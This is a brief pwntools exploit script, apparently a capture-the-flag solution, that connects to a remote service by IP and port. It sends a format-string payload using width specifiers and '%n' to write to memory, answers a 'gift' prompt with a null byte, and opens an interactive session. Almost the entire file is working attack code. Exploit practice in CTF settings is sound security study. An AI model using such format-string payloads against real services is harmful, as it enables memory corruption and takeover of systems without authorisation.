from pwn import *
context.log_level       = "DEBUG"
context.arch            = "amd64"
#p = process("./chall_patched")
p = remote("47.254.251.2", 4098)

payload =b"%*8$c%*9$c" + b"%11$n"
p.sendlineafter(b"your name:",payload)
p.sendlineafter (b"gift:",b"\x00")

p.interactive()

#11
